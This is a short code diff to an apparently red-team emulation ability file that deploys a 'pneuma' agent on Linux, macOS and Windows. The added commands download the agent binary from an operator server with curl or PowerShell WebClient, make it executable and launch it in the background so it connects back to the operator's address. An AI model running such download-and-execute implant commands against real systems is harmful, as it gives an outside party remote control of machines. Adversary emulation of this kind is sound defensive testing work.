@@ -21,14 +21,19 @@ technique:
 platforms:
   linux:
     sh:
-      command: nohup ./pneuma-linux >/dev/null 2>&1 &
-      payload: pneuma-linux
+      command: |
+        curl #{operator.http}/cea74c95ce1366db3d0d8fb1fc2f9b871fdd1e92/pneuma-linux > /tmp/pneuma && 
+        chmod +x /tmp/pneuma && 
+        nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{operator.tcp} &
   darwin:
     sh:
-      command: nohup ./pneuma-darwin -address "#{operator.http}" -contact http >/dev/null
-        2>&1 &
-      payload: pneuma-darwin
+      command: |
+        curl #{operator.http}/26b3acb4ca6dfd4df3f604ddfa0575a14f9e010d/pneuma-darwin > /tmp/pneuma && 
+        chmod +x /tmp/pneuma && 
+        nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{operator.tcp} &
   windows:
     psh:
-      command: Start-Process .\pneuma-windows.exe
-      payload: pneuma-windows.exe
+      command: |
+        $wc = New-Object System.Net.WebClient; 
+        $wc.DownloadFile("#{operator.http}/a470d3d08cab9af036c39652cec1096015f4570a/pneuma-windows.exe","C:\aws\download\pneuma-windows.exe"); 
+        Start-Process -FilePath .\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{operator.tcp}"
